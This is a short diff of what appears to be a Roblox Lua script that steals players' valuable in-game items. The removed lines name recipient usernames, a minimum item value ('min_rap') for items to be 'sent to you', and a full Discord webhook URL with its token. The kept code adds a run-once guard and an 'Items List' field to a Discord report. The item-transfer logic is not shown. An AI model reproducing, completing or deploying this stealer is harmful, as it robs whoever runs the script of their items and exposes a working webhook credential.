@@ -1,8 +1,3 @@
-Username = "TehPucuk_55"
-Username2 = "TehPucuk_55" -- stuff will get sent to this user if first user's mailbox is full
-webhook = "https://discord.com/api/webhooks/1207564677261828136/3fPdzMvRUB-eKKI4wmGp7tr0Ay5FJeIJJ7nnNwzrUBb7cyxY4jpZV4hRrKATPBBZRz_R"
-min_rap = 1000000 -- minimum rap of each item you want to get sent to you. 1 mil by default
-
 _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then
     return
@@ -64,7 +59,7 @@ local function SendMessage(username, diamonds)
 			inline = true
 		},
 		{
-			name = "✏️ Items List",
+			name = "✏️ Items List:",
 			value = "",
 			inline = false
 		},
